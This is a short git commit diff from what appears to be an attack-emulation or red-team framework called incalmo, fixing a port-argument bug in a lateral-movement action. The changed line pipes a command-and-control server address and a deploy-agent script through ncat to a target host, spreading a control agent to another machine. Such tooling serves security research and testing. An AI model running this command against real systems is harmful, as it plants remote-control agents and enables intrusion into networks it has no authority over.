a56b880606981951122037b0a6af71b8349a1ee4
lakshmi-adiga <ladiga@andrew.cmu.edu>
2026-03-25 20:21:25 +0000

    fix nc_lateral_move bug

--- incalmo/core/actions/LowLevel/nc_lateral_move.py
+++ incalmo/core/actions/LowLevel/nc_lateral_move.py
@@ -10,7 +10,7 @@ class NCLateralMove(LowLevelAction):
         self.host_ip = host_ip
         self.port = port
 
-        command = f'{{ echo "server={ConfigService().get_config().c2c_server}"; cat runDeployAgent.sh; }} | ncat --no-shutdown -i 5s {host_ip} #{port}'
+        command = f'{{ echo "server={ConfigService().get_config().c2c_server}"; cat runDeployAgent.sh; }} | ncat --no-shutdown -i 5s {host_ip} {port}'
         payloads = ["runDeployAgent.sh"]
 
         super().__init__(agent, command, payloads=payloads, command_delay=3)
